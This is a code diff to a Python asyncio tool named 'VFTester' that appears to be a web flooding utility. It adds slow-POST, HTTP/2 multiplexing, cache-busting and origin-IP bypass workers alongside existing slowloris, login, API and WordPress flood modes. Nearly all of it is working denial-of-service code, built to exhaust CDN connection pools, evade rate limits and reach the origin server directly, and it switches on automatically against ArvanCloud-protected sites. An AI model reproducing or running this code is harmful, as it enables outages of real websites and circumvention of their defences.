@@ -163,9 +163,11 @@ class LiveLog:
 
     def format_line(self, entry: dict) -> str:
         mode_colors = {'login': C.CY, 'page': C.B, 'resource': C.M,
-                       'slowloris': C.Y, 'api': C.G, 'viewstate': C.M, 'wp': C.CY}
+                       'slowloris': C.Y, 'api': C.G, 'viewstate': C.M, 'wp': C.CY,
+                       'slow_post': C.Y, 'h2mux': C.CY, 'cache_decep': C.M, 'origin': C.G}
         mode_icons = {'login': 'AUTH', 'page': 'PAGE', 'resource': 'RES ',
-                      'slowloris': 'SLOW', 'api': 'API ', 'viewstate': 'VS  ', 'wp': 'WP  '}
+                      'slowloris': 'SLOW', 'api': 'API ', 'viewstate': 'VS  ', 'wp': 'WP  ',
+                      'slow_post': 'SPO ', 'h2mux': 'H2M ', 'cache_decep': 'CD  ', 'origin': 'ORI '}
         mc = mode_colors.get(entry['mode'], C.W)
         icon = mode_icons.get(entry['mode'], '????')
         status = entry['status']
@@ -307,6 +309,10 @@ class Stats:
     api_hits: int = 0
     viewstate_hits: int = 0
     wp_hits: int = 0
+    slow_post_hits: int = 0
+    h2mux_hits: int = 0
+    cache_decep_hits: int = 0
+    origin_hits: int = 0
     rts: deque = field(default_factory=lambda: deque(maxlen=50000))
     codes: Dict[int, int] = field(default_factory=dict)
     _recent: deque = field(default_factory=lambda: deque(maxlen=5000))
@@ -704,6 +710,194 @@ class VFTester:
             self.health_monitor.record(result)
             self._record(result)
 
+    async def _worker_slow_post_read(self, session, delay=0):
+        """Slow POST/READ attack — send body bytes slowly to exhaust CDN connection pool"""
+        if delay > 0: await asyncio.sleep(delay)
+        while not self._stop.is_set():
+            t = time.time()
+            try:
+                headers = self._base_headers()
+                headers["Content-Type"] = "application/x-www-form-urlencoded"
+                headers["Content-Length"] = str(random.randint(50000, 200000))
+                headers["Transfer-Encoding"] = "chunked"
+                
+                async with session.post(self.url, headers=headers, data=self._slow_body_generator(),
+                                       ssl=False, timeout=aiohttp.ClientTimeout(total=60),
+                                       allow_redirects=False) as resp:
+                    elapsed = time.time() - t
+                    result = HitResult(ok=True, code=resp.status, rt=elapsed, mode="slow_post",
+                                      hint=f"SlowPOST {resp.status} {elapsed:.1f}s", url=self.url)
+                    await self.live_log.add("slow_post", resp.status, elapsed, None, self.url, result.hint)
+            except asyncio.TimeoutError:
+                elapsed = time.time() - t
+                result = HitResult(ok=True, code=None, rt=elapsed, mode="slow_post",
+                                  hint=f"SlowPOST timeout {elapsed:.1f}s", url=self.url)
+                await self.live_log.add("slow_post", None, elapsed, None, self.url, "timeout")
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slow_post", err=type(e).__name__)
+                await self.live_log.add("slow_post", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
+            self._record(result)
+
+    async def _slow_body_generator(self):
+        """Async generator that yields body bytes slowly for Slow POST attack"""
+        chunk_size = random.randint(1, 10)
+        total_sent = 0
+        max_size = random.randint(50000, 200000)
+        while total_sent < max_size and not self._stop.is_set():
+            chunk = random.choices(string.ascii_letters + string.digits, k=chunk_size)
+            yield ''.join(chunk).encode('utf-8')
+            total_sent += chunk_size
+            await asyncio.sleep(random.uniform(0.05, 0.3))  # Slow down transmission
+
+    async def _worker_http2_multiplex(self, session, delay=0):
+        """HTTP/2 multiplexing attack — many streams over single connection to bypass CDN rate limits"""
+        if delay > 0: await asyncio.sleep(delay)
+        while not self._stop.is_set():
+            t = time.time()
+            try:
+                # Try to use httpx for HTTP/2 support
+                import httpx
+                async with httpx.AsyncClient(http2=True, verify=False, timeout=15) as h2client:
+                    # Send many concurrent requests over a single H2 connection
+                    num_streams = random.randint(20, 50)
+                    tasks = []
+                    for _ in range(num_streams):
+                        busted = f"{self.url}{'&' if '?' in self.url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else self.url
+                        headers = {"User-Agent": random_ua(), "Accept": "text/html,*/*", 
+                                  "Cache-Control": "no-cache"}
+                        tasks.append(h2client.get(busted, headers=headers, follow_redirects=False))
+                    
+                    results = await asyncio.gather(*tasks, return_exceptions=True)
+                    elapsed = time.time() - t
+                    
+                    ok_count = sum(1 for r in results if isinstance(r, httpx.Response) and r.status_code < 500)
+                    fail_count = sum(1 for r in results if isinstance(r, Exception) or (isinstance(r, httpx.Response) and r.status_code >= 500))
+                    
+                    result = HitResult(ok=ok_count > 0, code=200, rt=elapsed, mode="h2mux",
+                                      hint=f"H2Mux {num_streams} streams {ok_count}ok/{fail_count}fail {elapsed:.1f}s", url=self.url)
+                    await self.live_log.add("h2mux", 200, elapsed, None, self.url, result.hint)
+                    self.health_monitor.record(result)
+            except ImportError:
+                # httpx not available, fall back to regular requests
+                await self._single_page(session, [self.url])
+                return
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="h2mux", err=type(e).__name__)
+                await self.live_log.add("h2mux", None, result.rt, type(e).__name__, self.url)
+                self.health_monitor.record(result)
+            self._record(result)
+            await asyncio.sleep(self.request_delay_ms / 1000)
+
+    async def _worker_cache_deception(self, session, delay=0):
+        """Cache deception attack — bypass CDN cache to hit origin server directly"""
+        if delay > 0: await asyncio.sleep(delay)
+        consecutive_fails = 0
+        while not self._stop.is_set():
+            t = time.time()
+            try:
+                # Build URL with cache-busting extensions that CDN doesn't cache
+                # e.g., /page.css?rand=xxx or /page/..%2f..%2forigin
+                path_tricks = [
+                    lambda u: f"{u}{'&' if '?' in u else '?'}{rand_cache_bust()}",
+                    lambda u: f"{u}{'&' if '?' in u else '?'}_=__{random.randint(100000,999999)}__",
+                    lambda u: f"{u.rstrip('/')}/..%2f..%2f{rand_cache_bust()}",
+                    lambda u: f"{u}{'&' if '?' in u else '?'}nocache={random.randint(1,99999)}.css",
+                    lambda u: f"{u}{'&' if '?' in u else '?'}{rand_cache_bust()}.json",
+                    lambda u: f"{u.rstrip('/')}/{rand_cache_bust()}/",
+                ]
+                url_trick = random.choice(path_tricks)(self.url)
+                
+                # Headers that force CDN to bypass cache
+                headers = self._base_headers()
+                headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
+                headers["Pragma"] = "no-cache"
+                headers["X-Arvan-Cache"] = "bypass"
+                headers["X-Cache-Bypass"] = "true"
+                headers["If-Modified-Since"] = "Sat, 01 Jan 2000 00:00:00 GMT"
+                headers["If-None-Match"] = f'W/"{random.randint(100000,999999)}"'
+                # Random Accept header variations
+                accept_types = [
+                    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
+                    "application/json, text/javascript, */*; q=0.01",
+                    "text/plain, */*",
+                    "*/*",
+                ]
+                headers["Accept"] = random.choice(accept_types)
+                
+                async with session.get(url_trick, headers=headers, ssl=False,
+                                       allow_redirects=True) as resp:
+                    body = await resp.text()
+                    elapsed = time.time() - t
+                    # Check if we hit origin (no CDN cache headers)
+                    hit_origin = "x-cache" not in {k.lower(): v for k, v in resp.headers.items()}
+                    hint_suffix = " ORIGIN!" if hit_origin else ""
+                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                      mode="cache_decep", hint=f"CacheDec {resp.status}{hint_suffix} ({len(body):,}B)", url=url_trick[:60])
+                    await self.live_log.add("cache_decep", resp.status, elapsed, None, self.url, result.hint)
+                    self.health_monitor.record(result)
+            except asyncio.TimeoutError:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cache_decep", err="Timeout", url=self.url)
+                await self.live_log.add("cache_decep", None, result.rt, "Timeout", self.url)
+                self.health_monitor.record(result)
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cache_decep", err=type(e).__name__, url=self.url)
+                await self.live_log.add("cache_decep", None, result.rt, type(e).__name__, self.url)
+                self.health_monitor.record(result)
+            self._record(result)
+            if not result.ok:
+                consecutive_fails += 1
+                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
+            else:
+                consecutive_fails = 0
+                await asyncio.sleep(self.request_delay_ms / 1000)
+
+    async def _worker_origin_direct(self, session, delay=0):
+        """Origin direct attack — bypass CDN by hitting the real server IP directly"""
+        if delay > 0: await asyncio.sleep(delay)
+        origin_ips = self.profile.get("origin_ips", [])
+        if not origin_ips:
+            return  # No origin IPs found
+        
+        consecutive_fails = 0
+        while not self._stop.is_set():
+            t = time.time()
+            try:
+                origin_ip = random.choice(origin_ips)
+                # Build URL pointing to origin IP with Host header
+                origin_url = self.url.replace(self.profile.get("host", ""), origin_ip)
+                
+                headers = self._base_headers()
+                headers["Host"] = self.profile.get("domain", self.site_root.replace("https://", "").replace("http://", ""))
+                headers["X-Forwarded-Host"] = self.profile.get("domain", "")
+                headers["X-Forwarded-Proto"] = "https"
+                headers["X-Real-IP"] = f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
+                
+                # Use ssl=False since origin IP won't match certificate
+                async with session.get(origin_url, headers=headers, ssl=False,
+                                       allow_redirects=False) as resp:
+                    body = await resp.text()
+                    elapsed = time.time() - t
+                    result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                      mode="origin", hint=f"Origin {resp.status} via {origin_ip} ({len(body):,}B)", url=origin_url[:60])
+                    await self.live_log.add("origin", resp.status, elapsed, None, self.url, result.hint)
+                    self.health_monitor.record(result)
+            except asyncio.TimeoutError:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="origin", err="Timeout", url=self.url)
+                await self.live_log.add("origin", None, result.rt, "Timeout", self.url)
+                self.health_monitor.record(result)
+            except Exception as e:
+                result = HitResult(ok=False, code=None, rt=time.time()-t, mode="origin", err=type(e).__name__, url=self.url)
+                await self.live_log.add("origin", None, result.rt, type(e).__name__, self.url)
+                self.health_monitor.record(result)
+            self._record(result)
+            if not result.ok:
+                consecutive_fails += 1
+                await asyncio.sleep(min(0.01 * (2 ** min(consecutive_fails, 6)), 20.0))
+            else:
+                consecutive_fails = 0
+                await asyncio.sleep(self.request_delay_ms / 1000)
+
     async def _worker_api(self, session, endpoints, delay=0):
         """API endpoint flooding worker"""
         if delay > 0: await asyncio.sleep(delay)
@@ -978,6 +1172,10 @@ class VFTester:
         elif r.mode == "api": self.stats.api_hits += 1
         elif r.mode == "viewstate": self.stats.viewstate_hits += 1
         elif r.mode == "wp": self.stats.wp_hits += 1
+        elif r.mode == "slow_post": self.stats.slow_post_hits += 1
+        elif r.mode == "h2mux": self.stats.h2mux_hits += 1
+        elif r.mode == "cache_decep": self.stats.cache_decep_hits += 1
+        elif r.mode == "origin": self.stats.origin_hits += 1
 
     async def _persistent_worker(self, session, vectors, pages, resources, delay=0):
         """Persistent worker wrapper — respawns inner workers when they die"""
@@ -1001,6 +1199,10 @@ class VFTester:
                     ssr_render_pct = weights.get("ssr_render_pct", 0.10)
                     viewstate_pct = 0
                     wp_pct = 0
+                    slow_post_pct = weights.get("slow_post_pct", 0.05)
+                    h2mux_pct = weights.get("h2mux_pct", 0.05)
+                    cache_decep_pct = weights.get("cache_decep_pct", 0.05)
+                    origin_pct = weights.get("origin_pct", 0.03)
                 else:
                     login_pct = 0.40
                     page_pct = 0.20
@@ -1012,13 +1214,19 @@ class VFTester:
                     ssr_render_pct = 0
                     viewstate_pct = 0.10 if self.is_aspnet else 0
                     wp_pct = 0.10 if self.is_wordpress else 0
+                    # ArvanCloud/CDN bypass workers
+                    slow_post_pct = 0.05 if (self.detected_waf and "arvan" in (self.detected_waf or "").lower()) else 0
+                    h2mux_pct = 0.05 if (self.detected_waf and "arvan" in (self.detected_waf or "").lower()) else 0
+                    cache_decep_pct = 0.08 if (self.detected_waf and "arvan" in (self.detected_waf or "").lower()) else 0
+                    origin_pct = 0.10 if self.profile.get("origin_ips") else 0
 
-                total = login_pct + page_pct + resource_pct + slowloris_pct + api_pct + graphql_pct + spa_route_pct + ssr_render_pct + viewstate_pct + wp_pct
+                total = login_pct + page_pct + resource_pct + slowloris_pct + api_pct + graphql_pct + spa_route_pct + ssr_render_pct + viewstate_pct + wp_pct + slow_post_pct + h2mux_pct + cache_decep_pct + origin_pct
                 if total == 0: total = 1
                 login_pct /= total; page_pct /= total; resource_pct /= total
                 slowloris_pct /= total; api_pct /= total; graphql_pct /= total
                 spa_route_pct /= total; ssr_render_pct /= total
                 viewstate_pct /= total; wp_pct /= total
+                slow_post_pct /= total; h2mux_pct /= total; cache_decep_pct /= total; origin_pct /= total
 
                 cumulative = 0
                 chosen = "page"
@@ -1052,6 +1260,18 @@ class VFTester:
                                                 else:
                                                     cumulative += wp_pct
                                                     if r < cumulative: chosen = "wp"
+                                                    else:
+                                                        cumulative += slow_post_pct
+                                                        if r < cumulative: chosen = "slow_post"
+                                                        else:
+                                                            cumulative += h2mux_pct
+                                                            if r < cumulative: chosen = "h2mux"
+                                                            else:
+                                                                cumulative += cache_decep_pct
+                                                                if r < cumulative: chosen = "cache_decep"
+                                                                else:
+                                                                    cumulative += origin_pct
+                                                                    if r < cumulative: chosen = "origin"
 
                 # Execute a single request cycle
                 if chosen == "login":
@@ -1076,6 +1296,14 @@ class VFTester:
                 elif chosen == "wp":
                     wp_config = self.attack.get("wordpress_config", {})
                     await self._single_wp(session, wp_config)
+                elif chosen == "slow_post":
+                    await self._single_slow_post_read(session)
+                elif chosen == "h2mux":
+                    await self._single_http2_multiplex(session)
+                elif chosen == "cache_decep":
+                    await self._single_cache_deception(session)
+                elif chosen == "origin":
+                    await self._single_origin_direct(session)
                 else:
                     await self._single_page(session, pages)
 
@@ -1282,6 +1510,139 @@ class VFTester:
             self.health_monitor.record(result)
         self._record(result)
 
+    async def _single_slow_post_read(self, session):
+        """Single slow POST/READ request"""
+        t = time.time()
+        try:
+            headers = self._base_headers()
+            headers["Content-Type"] = "application/x-www-form-urlencoded"
+            headers["Content-Length"] = str(random.randint(50000, 100000))
+            headers["Transfer-Encoding"] = "chunked"
+            
+            async with session.post(self.url, headers=headers, data=self._slow_body_generator(),
+                                   ssl=False, timeout=aiohttp.ClientTimeout(total=30),
+                                   allow_redirects=False) as resp:
+                elapsed = time.time() - t
+                result = HitResult(ok=True, code=resp.status, rt=elapsed, mode="slow_post",
+                                  hint=f"SlowPOST {resp.status} {elapsed:.1f}s", url=self.url)
+                await self.live_log.add("slow_post", resp.status, elapsed, None, self.url, result.hint)
+                self.health_monitor.record(result)
+        except asyncio.TimeoutError:
+            elapsed = time.time() - t
+            result = HitResult(ok=True, code=None, rt=elapsed, mode="slow_post",
+                              hint=f"SlowPOST timeout {elapsed:.1f}s", url=self.url)
+            await self.live_log.add("slow_post", None, elapsed, None, self.url, "timeout")
+            self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="slow_post", err=type(e).__name__)
+            await self.live_log.add("slow_post", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_http2_multiplex(self, session):
+        """Single HTTP/2 multiplexing burst"""
+        t = time.time()
+        try:
+            import httpx
+            async with httpx.AsyncClient(http2=True, verify=False, timeout=15) as h2client:
+                num_streams = random.randint(10, 30)
+                tasks = []
+                for _ in range(num_streams):
+                    busted = f"{self.url}{'&' if '?' in self.url else '?'}{rand_cache_bust()}" if self.enable_cache_bust else self.url
+                    headers = {"User-Agent": random_ua(), "Accept": "text/html,*/*",
+                              "Cache-Control": "no-cache"}
+                    tasks.append(h2client.get(busted, headers=headers, follow_redirects=False))
+                
+                results = await asyncio.gather(*tasks, return_exceptions=True)
+                elapsed = time.time() - t
+                
+                ok_count = sum(1 for r in results if isinstance(r, httpx.Response) and r.status_code < 500)
+                result = HitResult(ok=ok_count > 0, code=200, rt=elapsed, mode="h2mux",
+                                  hint=f"H2Mux {num_streams}str {ok_count}ok {elapsed:.1f}s", url=self.url)
+                await self.live_log.add("h2mux", 200, elapsed, None, self.url, result.hint)
+                self.health_monitor.record(result)
+        except ImportError:
+            await self._single_page(session, [self.url])
+            return
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="h2mux", err=type(e).__name__)
+            await self.live_log.add("h2mux", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_cache_deception(self, session):
+        """Single cache deception request"""
+        t = time.time()
+        try:
+            path_tricks = [
+                lambda u: f"{u}{'&' if '?' in u else '?'}{rand_cache_bust()}",
+                lambda u: f"{u}{'&' if '?' in u else '?'}nocache={random.randint(1,99999)}.css",
+                lambda u: f"{u}{'&' if '?' in u else '?'}{rand_cache_bust()}.json",
+            ]
+            url_trick = random.choice(path_tricks)(self.url)
+            
+            headers = self._base_headers()
+            headers["Cache-Control"] = "no-cache, no-store, must-revalidate, max-age=0"
+            headers["Pragma"] = "no-cache"
+            headers["X-Arvan-Cache"] = "bypass"
+            headers["If-Modified-Since"] = "Sat, 01 Jan 2000 00:00:00 GMT"
+            headers["If-None-Match"] = f'W/"{random.randint(100000,999999)}"'
+            
+            async with session.get(url_trick, headers=headers, ssl=False,
+                                   allow_redirects=True) as resp:
+                body = await resp.text()
+                elapsed = time.time() - t
+                hit_origin = "x-cache" not in {k.lower(): v for k, v in resp.headers.items()}
+                hint_suffix = " ORIGIN!" if hit_origin else ""
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="cache_decep", hint=f"CacheDec {resp.status}{hint_suffix}", url=self.url)
+                await self.live_log.add("cache_decep", resp.status, elapsed, None, self.url, result.hint)
+                self.health_monitor.record(result)
+        except asyncio.TimeoutError:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cache_decep", err="Timeout", url=self.url)
+            await self.live_log.add("cache_decep", None, result.rt, "Timeout", self.url)
+            self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="cache_decep", err=type(e).__name__, url=self.url)
+            await self.live_log.add("cache_decep", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
+        self._record(result)
+
+    async def _single_origin_direct(self, session):
+        """Single origin direct request"""
+        origin_ips = self.profile.get("origin_ips", [])
+        if not origin_ips:
+            await self._single_page(session, [self.url])
+            return
+        
+        t = time.time()
+        try:
+            origin_ip = random.choice(origin_ips)
+            origin_url = self.url.replace(self.profile.get("host", ""), origin_ip)
+            
+            headers = self._base_headers()
+            headers["Host"] = self.profile.get("domain", self.site_root.replace("https://", "").replace("http://", ""))
+            headers["X-Forwarded-Host"] = self.profile.get("domain", "")
+            headers["X-Forwarded-Proto"] = "https"
+            
+            async with session.get(origin_url, headers=headers, ssl=False,
+                                   allow_redirects=False) as resp:
+                body = await resp.text()
+                elapsed = time.time() - t
+                result = HitResult(ok=resp.status < 500, code=resp.status, rt=elapsed,
+                                  mode="origin", hint=f"Origin {resp.status} via {origin_ip}", url=origin_url[:60])
+                await self.live_log.add("origin", resp.status, elapsed, None, self.url, result.hint)
+                self.health_monitor.record(result)
+        except asyncio.TimeoutError:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="origin", err="Timeout", url=self.url)
+            await self.live_log.add("origin", None, result.rt, "Timeout", self.url)
+            self.health_monitor.record(result)
+        except Exception as e:
+            result = HitResult(ok=False, code=None, rt=time.time()-t, mode="origin", err=type(e).__name__, url=self.url)
+            await self.live_log.add("origin", None, result.rt, type(e).__name__, self.url)
+            self.health_monitor.record(result)
+        self._record(result)
+
     def _spawn_worker(self, session, all_tasks, vectors, pages, resources, delay=0):
         """Spawn a persistent worker that auto-respawns on failure"""
         t = asyncio.create_task(self._persistent_worker(session, vectors, pages, resources, delay=delay))
@@ -1334,6 +1695,10 @@ class VFTester:
         if self.stats.api_hits > 0: bd_parts.append(f"API:{self.stats.api_hits:,}")
         if self.stats.viewstate_hits > 0: bd_parts.append(f"VS:{self.stats.viewstate_hits:,}")
         if self.stats.wp_hits > 0: bd_parts.append(f"WP:{self.stats.wp_hits:,}")
+        if self.stats.slow_post_hits > 0: bd_parts.append(f"SlowP:{self.stats.slow_post_hits:,}")
+        if self.stats.h2mux_hits > 0: bd_parts.append(f"H2Mux:{self.stats.h2mux_hits:,}")
+        if self.stats.cache_decep_hits > 0: bd_parts.append(f"CD:{self.stats.cache_decep_hits:,}")
+        if self.stats.origin_hits > 0: bd_parts.append(f"Origin:{self.stats.origin_hits:,}")
         line3 = f"  {C.DM}Breakdown: {' | '.join(bd_parts)}{C.RS}" if bd_parts else ""
 
         log_lines = self.live_log.get_lines()
@@ -1375,6 +1740,8 @@ class VFTester:
         if self.detected_cms: print(f"  CMS:      {C.Y}{self.detected_cms}{C.RS}")
         if self.is_aspnet:    print(f"  ASP.NET:  {C.M}ViewState Attack Enabled{C.RS}")
         if self.is_wordpress: print(f"  WordPress:{C.CY} XMLRPC + WP-Login Enabled{C.RS}")
+        origin_ips = self.profile.get("origin_ips", [])
+        if origin_ips: print(f"  Origin:   {C.G}{len(origin_ips)} IPs found (CDN bypass){C.RS}")
         print(f"  Vectors:  {', '.join(vectors)}")
         print(f"  Workers:  {C.BD}{actual_max:,}{C.RS} (initial: {self.initial_workers}, step: +{self.step})")
         print(f"  Pages:    {len(pages)} | Resources: {len(resources)}")
